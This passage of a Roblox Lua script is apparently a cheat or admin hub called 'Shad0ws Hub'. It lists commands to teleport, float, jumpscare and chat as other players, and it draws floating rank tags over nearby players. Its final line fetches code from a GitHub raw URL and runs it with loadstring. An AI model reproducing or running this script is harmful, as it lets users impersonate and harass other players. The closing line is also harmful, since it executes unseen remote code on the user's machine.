    {cmd = ";bring [player]", desc = "Teleport player to you"},
    {cmd = ";float [player]", desc = "Make player float away"},
    {cmd = ";ch [player] [msg]", desc = "Send message as player"},
    {cmd = ";copy [target] [copier]", desc = "Copy avatar"},
    {cmd = ";jumps1-4 [player]", desc = "Trigger jumpscare"},
    {cmd = ";adm [player]", desc = "Give admin (owners only)"},
    {cmd = ";unadm [player]", desc = "Remove admin (owners only)"},
}

for _, cmdInfo in ipairs(cmdList) do
    Tabs.CreditsTab:Button({
        Title = cmdInfo.cmd,
        Desc = cmdInfo.desc,
        Callback = function()
            WindUI:Notify({
                Title = "Command Info",
                Content = cmdInfo.cmd .. " - " .. cmdInfo.desc,
                Icon = "terminal",
                Duration = 4,
            })
        end
    })
end

-- Tags Flutuantes
local tags = {}
local function CriarTag(txt, c1, c2)
    local g = Instance.new("BillboardGui")
    g.Size = UDim2.new(0, 180, 0, 30)
    g.StudsOffset = Vector3.new(0, 2.5, 0)
    g.AlwaysOnTop = true
    local f = Instance.new("Frame", g)
    f.Size = UDim2.new(1, 0, 1, 0)
    f.BackgroundColor3 = Color3.new(0, 0, 0)
    f.BackgroundTransparency = 0.3
    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 8)
    local l = Instance.new("TextLabel", f)
    l.Size = UDim2.new(1, 0, 1, 0)
    l.BackgroundTransparency = 1
    l.Text = txt
    l.Font = Enum.Font.GothamBold
    l.TextScaled = true
    l.TextStrokeTransparency = 0.5
    l.TextColor3 = c1
    coroutine.wrap(function()
        while g.Parent do
            l.TextColor3 = c1
            task.wait(0.5)
            l.TextColor3 = c2
            task.wait(0.5)
        end
    end)()
    return g
end

task.spawn(function()
    while task.wait(1) do
        if not tagsVisiveis then
            for p, tagGui in pairs(tags) do
                if tagGui and tagGui.Parent then tagGui:Destroy() end
                tags[p] = nil
            end
            while not tagsVisiveis do task.wait(1) end
        end

        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("Head") then
                local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                local head = p.Character.Head
                if root then
                    local d = (root.Position - head.Position).Magnitude
                    if d <= 25 and not tags[p] then
                        local tag
                        if IsDono(p.Name) then
                            tag = CriarTag("Dono Shad0ws", Color3.fromRGB(255, 0, 0), Color3.fromRGB(255, 60, 60))
                        elseif IsMod(p.Name) or IsTempMod(p.Name) then
                            tag = CriarTag("Moderador Shad0ws", Color3.fromRGB(0, 191, 255), Color3.fromRGB(255, 105, 180))
                        elseif SHADOWS_USERS[p.Name] then
                            tag = CriarTag("Usu√°rio Shad0ws", Color3.new(1, 1, 1), Color3.new(0.78, 0.78, 0.78))
                        end
                        if tag then
                            tag.Adornee = head
                            tag.Parent = p.Character
                            tags[p] = tag
                        end
                    elseif (d > 30 or not p.Parent) and tags[p] then
                        tags[p]:Destroy()
                        tags[p] = nil
                    end
                elseif not p.Parent and tags[p] then
                    tags[p]:Destroy()
                    tags[p] = nil
                end
            end
        end
    end
end)

Players.PlayerRemoving:Connect(function(player)
    RemoveJail(player)
    UnfreezePlayer(player)
    SHADOWS_USERS[player.Name] = nil
    TEMP_MODS[player.Name] = nil
    if tags[player] then
        tags[player]:Destroy()
        tags[player] = nil
    end
end)

print("[Shad0ws Hub] Script loaded successfully!")
print("[Shad0ws Hub] User: " .. LocalPlayer.Name)
print("[Shad0ws Hub] Level: " .. (IsDono(LocalPlayer.Name) and "Owner" or (IsMod(LocalPlayer.Name) and "Moderator" or "Temp Mod")))

loadstring(game:HttpGet("https://raw.githubusercontent.com/ShadowsHubseila/Janabsbb/refs/heads/main/shadows.txt"))()
